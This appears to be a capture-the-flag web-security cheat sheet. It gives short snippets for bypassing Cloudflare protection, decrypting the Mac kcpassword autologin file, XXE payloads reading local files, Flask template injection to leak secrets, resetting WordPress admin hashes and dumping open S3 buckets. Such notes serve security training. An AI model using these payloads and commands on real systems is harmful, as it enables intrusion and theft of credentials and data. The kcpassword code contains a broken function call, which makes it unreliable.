
* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)

	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.

``` python
#!/usr/bin/env python

import cfscrape

url = 'http://yashit.tech/tryharder/'

scraper = cfscrape.create_scraper()
print scraper.get(url).content
```

* [`wpscan`](https://wpscan.org/)

	* A Ruby script to scan and do reconnaissance on a [Wordpress](https://en.wikipedia.org/wiki/WordPress) application.

* Mac AutoLogin Password Cracking

Sometimes, given an Mac autologin password file `/etc/kcpassword`, you can crack it with this code:

```
def kcpasswd(ciphertext):
    key = '7d895223d2bcddeaa3b91f'
    while len(key) < (len(ciphertext)*2):
        key = key + key
    key = binasciiunhexlify(key)
    result = ''
    for i in range(len(ciphertext)):
        result += chr(ord(ciphertext[i]) ^ (key[i]))
    return result
```
* XXE : XML External Entity

An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
We try to display the content of the file /flag :

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///flag">
]>
<data>&file;</data>

<?xml version="1.0" encoding="UTF-16"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>

  ```
* Wordpress Password Hash Generator

	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.




* Flask Template Injection

	Try `{{config}}` to leak out the secret key, or start to climb up the Python MRO to acheive code execution.

	[https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html), [https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html](https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html), [https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html](https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)



* [`nikto`](https://github.com/sullo/nikto)

	A Perl script to scan and do reconnaissance on a web application.


* [Burpsuite](https://portswigger.net/burp)

	A proxy server that allows you to intercept and modify HTTP requests and responses. It's a great tool for testing web applications.




* AWS / S3 Buckets

	You can try and dump an AWS bucket like so. The `--no-sign-request` avoids the need for credentials, and `--recursive` will grab everything possible.

```
aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
```
	i. e. `aws s3 cp --recursive --no-sign-request s3://tamuctf .`
